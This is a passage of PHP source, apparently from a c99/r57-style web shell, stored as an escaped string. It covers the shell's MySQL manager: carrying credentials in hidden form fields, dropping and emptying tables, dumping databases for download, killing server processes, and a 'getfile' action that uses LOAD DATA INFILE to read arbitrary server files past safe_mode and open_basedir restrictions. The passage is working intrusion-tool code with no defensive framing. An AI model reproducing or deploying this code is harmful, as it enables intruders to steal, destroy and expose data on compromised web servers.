if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\\"".$item[1]."\\">".$item[0]."</a> ] ";}}\r\n   echo "</b></center>";\r\n   $acts = array("","dump");\r\n   if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}\r\n   elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \\n";} $sql_act = "query";}\r\n   elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}\r\n   elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}\r\n   elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}\r\n   elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}\r\n   elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}\r\n   elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}\r\n   elseif ($sql_tbl_act == "insert")\r\n   {\r\n    if ($sql_tbl_insert_radio == 1)\r\n    {\r\n     $keys = "";\r\n     $akeys = array_keys($sql_tbl_insert);\r\n     foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}\r\n     if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}\r\n     $values = "";\r\n     $i = 0;\r\n     foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "\'".addslashes($v)."\'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}\r\n     if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}\r\n     $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";\r\n     $sql_act = "query";\r\n     $sql_tbl_act = "browse";\r\n    }\r\n    elseif ($sql_tbl_insert_radio == 2)\r\n    {\r\n     $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);\r\n     $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";\r\n     $result = mysql_query($sql_query) or print(mysql_smarterror());\r\n     $result = mysql_fetch_array($result, MYSQL_ASSOC);\r\n     $sql_act = "query";\r\n     $sql_tbl_act = "browse";\r\n    }\r\n   }\r\n   if ($sql_act == "query")\r\n   {\r\n    echo "<hr size=\\"1\\" noshade>";\r\n    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}\r\n    if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}\r\n    if ((!$submit) or ($sql_act)) {echo "<table border=\\"0\\" width=\\"100%\\" height=\\"1\\"><tr><td><form action=\\"".$sql_surl."\\" method=\\"POST\\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\\"sql_query\\" cols=\\"100\\" rows=\\"10\\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\\"hidden\\" name=\\"sql_act\\" value=\\"query\\"><input type=\\"hidden\\" name=\\"sql_tbl\\" value=\\"".htmlspecialchars($sql_tbl)."\\"><input type=\\"hidden\\" name=\\"submit\\" value=\\"1\\"><input type=\\"hidden\\" name=\\"sql_goto\\" value=\\"".htmlspecialchars($sql_goto)."\\"><input type=\\"submit\\" name=\\"sql_confirm\\" value=\\"Yes\\">&nbsp;<input type=\\"submit\\" value=\\"No\\"></form></td></tr></table>";}\r\n   }\r\n   if (in_array($sql_act,$acts))\r\n   {\r\n    ?><table border="0" width="100%" height="1"><tr>\r\n    <td width="30%" height="1"><b>Create a new table:</b>\r\n      <form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td>\r\n    \r\n    <td width="30%" height="1"><b>Dump DataBase:</b>\r\n      <form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type="submit" name=\\"submit\\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php\r\n    if (!empty($sql_act)) {echo "<hr size=\\"1\\" noshade>";}\r\n    if ($sql_act == "newtbl")\r\n    {\r\n     echo "<b>";\r\n     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \\"".htmlspecialchars($sql_newdb)."\\" has been created with success!</b><br>";\r\n    }\r\n    else {echo "Can\'t create DB \\"".htmlspecialchars($sql_newdb)."\\".<br>Reason:</b> ".mysql_smarterror();}\r\n   }\r\n   elseif ($sql_act == "dump")\r\n   {\r\n    if (empty($submit))\r\n    {\r\n     $diplay = FALSE;\r\n     echo "<form method=\\"GET\\"><input type=\\"hidden\\" name=\\"act\\" value=\\"sql\\"><input type=\\"hidden\\" name=\\"sql_act\\" value=\\"dump\\"><input type=\\"hidden\\" name=\\"sql_db\\" value=\\"".htmlspecialchars($sql_db)."\\"><input type=\\"hidden\\" name=\\"sql_login\\" value=\\"".htmlspecialchars($sql_login)."\\"><input type=\\"hidden\\" name=\\"sql_passwd\\" value=\\"".htmlspecialchars($sql_passwd)."\\"><input type=\\"hidden\\" name=\\"sql_server\\" value=\\"".htmlspecialchars($sql_server)."\\"><input type=\\"hidden\\" name=\\"sql_port\\" value=\\"".htmlspecialchars($sql_port)."\\"><input type=\\"hidden\\" name=\\"sql_tbl\\" value=\\"".htmlspecialchars($sql_tbl)."\\"><b>SQL-Dump:</b><br><br>";\r\n     echo "<b>DB:</b>&nbsp;<input type=\\"text\\" name=\\"sql_db\\" value=\\"".urlencode($sql_db)."\\"><br><br>";\r\n     $v = join (";",$dmptbls);\r\n     echo "<b>Only tables (explode \\";\\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\\"text\\" name=\\"dmptbls\\" value=\\"".htmlspecialchars($v)."\\" size=\\"".(strlen($v)+5)."\\"><br><br>";\r\n     if ($dump_file) {$tmp = $dump_file;}\r\n     else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}\r\n     echo "<b>File:</b>&nbsp;<input type=\\"text\\" name=\\"sql_dump_file\\" value=\\"".$tmp."\\" size=\\"".(strlen($tmp)+strlen($tmp) % 30)."\\"><br><br>";\r\n     echo "<b>Download: </b>&nbsp;<input type=\\"checkbox\\" name=\\"sql_dump_download\\" value=\\"1\\" checked><br><br>";\r\n     echo "<b>Save to file: </b>&nbsp;<input type=\\"checkbox\\" name=\\"sql_dump_savetofile\\" value=\\"1\\" checked>";\r\n     echo "<br><br><input type=\\"submit\\" name=\\"submit\\" value=\\"Dump\\"><br><br><b><sup>1</sup></b> - all, if empty";\r\n     echo "</form>";\r\n    }\r\n    else\r\n    {\r\n     $diplay = TRUE;\r\n     $set = array();\r\n     $set["sock"] = $sql_sock;\r\n     $set["db"] = $sql_db;\r\n     $dump_out = "download";\r\n     $set["print"] = 0;\r\n     $set["nl2br"] = 0;\r\n     $set[""] = 0;\r\n     $set["file"] = $dump_file;\r\n     $set["add_drop"] = TRUE;\r\n     $set["onlytabs"] = array();\r\n     if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}\r\n     $ret = mysql_dump($set);\r\n     if ($sql_dump_download)\r\n     {\r\n      @ob_clean();\r\n      header("Content-type: application/octet-stream");\r\n      header("Content-length: ".strlen($ret));\r\n      header("Content-disposition: attachment; filename=\\"".basename($sql_dump_file)."\\";");\r\n      echo $ret;\r\n      exit;\r\n     }\r\n     elseif ($sql_dump_savetofile)\r\n     {\r\n      $fp = fopen($sql_dump_file,"w");\r\n      if (!$fp) {echo "<b>Dump error! Can\'t write to \\"".htmlspecialchars($sql_dump_file)."\\"!";}\r\n      else\r\n      {\r\n       fwrite($fp,$ret);\r\n       fclose($fp);\r\n       echo "<b>Dumped! Dump has been writed to \\"".htmlspecialchars(realpath($sql_dump_file))."\\" (".view_size(filesize($sql_dump_file)).")</b>.";\r\n      }\r\n     }\r\n     else {echo "<b>Dump: nothing to do!</b>";}\r\n    }\r\n   }\r\n   if ($diplay)\r\n   {\r\n    if (!empty($sql_tbl))\r\n    {\r\n     if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}\r\n     $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");\r\n     $count_row = mysql_fetch_array($count);\r\n     mysql_free_result($count);\r\n     $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");\r\n     $tbl_struct_fields = array();\r\n     while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}\r\n     if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}\r\n     if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}\r\n     if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}\r\n     if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}\r\n     $perpage = $sql_tbl_le - $sql_tbl_ls;\r\n     if (!is_numeric($perpage)) {$perpage = 10;}\r\n     $numpages = $count_row[0]/$perpage;\r\n     $e = explode(" ",$sql_order);\r\n     if (count($e) == 2)\r\n     {\r\n      if ($e[0] == "d") {$asc_desc = "DESC";}\r\n      else {$asc_desc = "ASC";}\r\n      $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";\r\n     }\r\n     else {$v = "";}\r\n     $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";\r\n     $result = mysql_query($query) or print(mysql_smarterror());\r\n     echo "<hr size=\\"1\\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";\r\n     echo "<a href=\\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";\r\n     echo "<a href=\\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";\r\n     echo "<a href=\\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";\r\n     echo "<a href=\\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";\r\n     if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}\r\n     if ($sql_tbl_act == "insert")\r\n     {\r\n      if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}\r\n      if (!empty($sql_tbl_insert_radio))\r\n      {\r\n\r\n      }\r\n      else\r\n      {\r\n       echo "<br><br><b>Inserting row into table:</b><br>";\r\n       if (!empty($sql_tbl_insert_q))\r\n       {\r\n        $sql_query = "SELECT * FROM `".$sql_tbl."`";\r\n        $sql_query .= " WHERE".$sql_tbl_insert_q;\r\n        $sql_query .= " LIMIT 1;";\r\n        $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());\r\n        $values = mysql_fetch_assoc($result);\r\n        mysql_free_result($result);\r\n       }\r\n       else {$values = array();}\r\n       echo "<form method=\\"POST\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\"1%\\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";\r\n       foreach ($tbl_struct_fields as $field)\r\n       {\r\n        $name = $field["Field"];\r\n        if (empty($sql_tbl_insert_q)) {$v = "";}\r\n        echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\\"><option value=\\"\\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\\"\\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\\"text\\" name=\\"sql_tbl_insert[".htmlspecialchars($name)."]\\" value=\\"".htmlspecialchars($values[$name])."\\" size=50></td></tr>";\r\n        $i++;\r\n       }\r\n       echo "</table><br>";\r\n       echo "<input type=\\"radio\\" name=\\"sql_tbl_insert_radio\\" value=\\"1\\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";\r\n       if (!empty($sql_tbl_insert_q)) {echo " or <input type=\\"radio\\" name=\\"sql_tbl_insert_radio\\" value=\\"2\\" checked><b>Save</b>"; echo "<input type=\\"hidden\\" name=\\"sql_tbl_insert_q\\" value=\\"".htmlspecialchars($sql_tbl_insert_q)."\\">";}\r\n       echo "<br><br><input type=\\"submit\\" value=\\"Confirm\\"></form>";\r\n      }\r\n     }\r\n     if ($sql_tbl_act == "browse")\r\n     {\r\n      $sql_tbl_ls = abs($sql_tbl_ls);\r\n      $sql_tbl_le = abs($sql_tbl_le);\r\n      echo "<hr size=\\"1\\" noshade>";\r\n      echo "[Pages]&nbsp;";\r\n      $b = 0;\r\n      for($i=0;$i<$numpages;$i++)\r\n      {\r\n       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\\"><u>";}\r\n       echo $i;\r\n       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}\r\n       if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}\r\n       else {echo "&nbsp;";}\r\n      }\r\n      if ($i == 0) {echo "empty";}\r\n      echo "<form method=\\"GET\\"><input type=\\"hidden\\" name=\\"act\\" value=\\"sql\\"><input type=\\"hidden\\" name=\\"sql_db\\" value=\\"".htmlspecialchars($sql_db)."\\"><input type=\\"hidden\\" name=\\"sql_login\\" value=\\"".htmlspecialchars($sql_login)."\\"><input type=\\"hidden\\" name=\\"sql_passwd\\" value=\\"".htmlspecialchars($sql_passwd)."\\"><input type=\\"hidden\\" name=\\"sql_server\\" value=\\"".htmlspecialchars($sql_server)."\\"><input type=\\"hidden\\" name=\\"sql_port\\" value=\\"".htmlspecialchars($sql_port)."\\"><input type=\\"hidden\\" name=\\"sql_tbl\\" value=\\"".htmlspecialchars($sql_tbl)."\\"><input type=\\"hidden\\" name=\\"sql_order\\" value=\\"".htmlspecialchars($sql_order)."\\"><b>From:</b>&nbsp;<input type=\\"text\\" name=\\"sql_tbl_ls\\" value=\\"".$sql_tbl_ls."\\">&nbsp;<b>To:</b>&nbsp;<input type=\\"text\\" name=\\"sql_tbl_le\\" value=\\"".$sql_tbl_le."\\">&nbsp;<input type=\\"submit\\" value=\\"View\\"></form>";\r\n      echo "<br><form method=\\"POST\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\"1%\\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>";\r\n      echo "<tr>";\r\n      echo "<td><input type=\\"checkbox\\" name=\\"boxrow_all\\" value=\\"1\\"></td>";\r\n      for ($i=0;$i<mysql_num_fields($result);$i++)\r\n      {\r\n       $v = mysql_field_name($result,$i);\r\n       if ($e[0] == "a") {$s = "d"; $m = "asc";}\r\n       else {$s = "a"; $m = "desc";}\r\n       echo "<td>";\r\n       if (empty($e[0])) {$e[0] = "a";}\r\n       if ($e[1] != $v) {echo "<a href=\\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\\"><b>".$v."</b></a>";}\r\n       else {echo "<b>".$v."</b><a href=\\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\\">[sort]</a>";}\r\n       echo "</td>";\r\n      }\r\n      echo "<td><font color=\\"green\\"><b>Action</b></font></td>";\r\n      echo "</tr>";\r\n      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))\r\n      {\r\n       echo "<tr>";\r\n       $w = "";\r\n       $i = 0;\r\n       foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = \'".addslashes($v)."\' AND"; $i++;}\r\n       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}\r\n       echo "<td><input type=\\"checkbox\\" name=\\"boxrow[]\\" value=\\"".$w."\\"></td>";\r\n       $i = 0;\r\n       foreach ($row as $k=>$v)\r\n       {\r\n        $v = htmlspecialchars($v);\r\n        if ($v == "") {$v = "<font color=\\"green\\">NULL</font>";}\r\n        echo "<td>".$v."</td>";\r\n        $i++;\r\n       }\r\n       echo "<td>";\r\n       echo "<a href=\\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\\">[Delete]</a>&nbsp;";\r\n       echo "<a href=\\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\\"><b>[Edit]</b></a>&nbsp;";\r\n       echo "</td>";\r\n       echo "</tr>";\r\n      }\r\n      mysql_free_result($result);\r\n      echo "</table><hr size=\\"1\\" noshade><p align=\\"left\\"><select name=\\"sql_act\\">";\r\n      echo "<option value=\\"\\">With selected:</option>";\r\n      echo "<option value=\\"deleterow\\">Delete</option>";\r\n      echo "</select>&nbsp;<input type=\\"submit\\" value=\\"Confirm\\"></form></p>";\r\n     }\r\n    }\r\n    else\r\n    {\r\n     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);\r\n     if (!$result) {echo mysql_smarterror();}\r\n     else\r\n     {\r\n      echo "<br><form method=\\"POST\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\"100%\\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type=\\"checkbox\\" name=\\"boxtbl_all\\" value=\\"1\\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";\r\n      $i = 0;\r\n      $tsize = $trows = 0;\r\n      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))\r\n      {\r\n       $tsize += $row["Data_length"];\r\n       $trows += $row["Rows"];\r\n       $size = view_size($row["Data_length"]);\r\n       echo "<tr>";\r\n       echo "<td><input type=\\"checkbox\\" name=\\"boxtbl[]\\" value=\\"".$row["Name"]."\\"></td>";\r\n       echo "<td>&nbsp;<a href=\\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\\"><b>".$row["Name"]."</b></a>&nbsp;</td>";\r\n       echo "<td>".$row["Rows"]."</td>";\r\n       echo "<td>".$row["Type"]."</td>";\r\n       echo "<td>".$row["Create_time"]."</td>";\r\n       echo "<td>".$row["Update_time"]."</td>";\r\n       echo "<td>".$size."</td>";\r\n       echo "<td>&nbsp;<a href=\\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\\">[Empty]</a>&nbsp;&nbsp;<a href=\\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\\">[Drop]</a>&nbsp;<a href=\\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\\"><b>[Insert]</b></a>&nbsp;</td>";\r\n       echo "</tr>";\r\n       $i++;\r\n      }\r\n      echo "<tr bgcolor=\\"000000\\">";\r\n      echo "<td><center><b>\xbb</b></center></td>";\r\n      echo "<td><center><b>".$i." table(s)</b></center></td>";\r\n      echo "<td><b>".$trows."</b></td>";\r\n      echo "<td>".$row[1]."</td>";\r\n      echo "<td>".$row[10]."</td>";\r\n      echo "<td>".$row[11]."</td>";\r\n      echo "<td><b>".view_size($tsize)."</b></td>";\r\n      echo "<td></td>";\r\n      echo "</tr>";\r\n      echo "</table><hr size=\\"1\\" noshade><p align=\\"right\\"><select name=\\"sql_act\\">";\r\n      echo "<option value=\\"\\">With selected:</option>";\r\n      echo "<option value=\\"tbldrop\\">Drop</option>";\r\n      echo "<option value=\\"tblempty\\">Empty</option>";\r\n      echo "<option value=\\"tbldump\\">Dump</option>";\r\n      echo "<option value=\\"tblcheck\\">Check table</option>";\r\n      echo "<option value=\\"tbloptimize\\">Optimize table</option>";\r\n      echo "<option value=\\"tblrepair\\">Repair table</option>";\r\n      echo "<option value=\\"tblanalyze\\">Analyze table</option>";\r\n      echo "</select>&nbsp;<input type=\\"submit\\" value=\\"Confirm\\"></form></p>";\r\n      mysql_free_result($result);\r\n     }\r\n    }\r\n   }\r\n   }\r\n  }\r\n  else\r\n  {\r\n   $acts = array("","newdb","serverstatus","servervars","processes","getfile");\r\n   if (in_array($sql_act,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DataBase:</b>\r\n            <form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }\r\n   if (!empty($sql_act))\r\n   {\r\n    echo "<hr size=\\"1\\" noshade>";\r\n    if ($sql_act == "newdb")\r\n    {\r\n     echo "<b>";\r\n     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \\"".htmlspecialchars($sql_newdb)."\\" has been created with success!</b><br>";}\r\n     else {echo "Can\'t create DB \\"".htmlspecialchars($sql_newdb)."\\".<br>Reason:</b> ".mysql_smarterror();}\r\n    }\r\n    if ($sql_act == "serverstatus")\r\n    {\r\n     $result = mysql_query("SHOW STATUS", $sql_sock);\r\n     echo "<center><b>Server-status variables:</b><br><br>";\r\n     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";\r\n     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}\r\n     echo "</table></center>";\r\n     mysql_free_result($result);\r\n    }\r\n    if ($sql_act == "servervars")\r\n    {\r\n     $result = mysql_query("SHOW VARIABLES", $sql_sock);\r\n     echo "<center><b>Server variables:</b><br><br>";\r\n     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";\r\n     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}\r\n     echo "</table>";\r\n     mysql_free_result($result);\r\n    }\r\n    if ($sql_act == "processes")\r\n    {\r\n     if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";}\r\n     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);\r\n     echo "<center><b>Processes:</b><br><br>";\r\n     echo "<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";\r\n     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\\"".$sql_surl."sql_act=processes&kill=".$row[0]."\\"><u>Kill</u></a></td></tr>";}\r\n     echo "</table>";\r\n     mysql_free_result($result);\r\n    }\r\n    if ($sql_act == "getfile")\r\n    {\r\n     $tmpdb = $sql_login."_tmpdb";\r\n     $select = mysql_select_db($tmpdb);\r\n     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}\r\n     if ($select)\r\n     {\r\n      $created = FALSE;\r\n      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");\r\n      mysql_query("LOAD DATA INFILE \\"".addslashes($sql_getfile)."\\" INTO TABLE tmp_file");\r\n      $result = mysql_query("SELECT * FROM tmp_file;");\r\n      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}\r\n      else\r\n      {\r\n       for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}\r\n       $f = "";\r\n       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\\r\\n",$row);}\r\n       if (empty($f)) {echo "<b>File \\"".$sql_getfile."\\" does not exists or empty!</b><br>";}\r\n       else {echo "<b>File \\"".$sql_getfile."\\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}\r\n       mysql_free_result($result);\r\n       mysql_query("DROP TABLE tmp_file;");\r\n      }\r\n     }\r\n     mysql_drop_db($tmpdb); //comment it if you want to leave database\r\n    }\r\n   }\r\n  }\r\n }\r\n echo "</td></tr></table>";\r\n if ($sql_sock)\r\n {\r\n  $affected = @mysql_affected_rows($sql_sock);\r\n  if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}\r\n  echo "<tr><td><center><b>Affected rows: ".$affected."</center></td></tr>";\r\n }\r\n echo "</table>";\r\n}\r\nif ($act == "mkdir")\r\n{\r\n if ($mkdir != $d)\r\n {\r\n  if (file_exists($mkdir)) {echo "<b>Make Dir \\"".htmlspecialchars($mkdir)."\\"</b>: object alredy exists";}\r\n  elseif 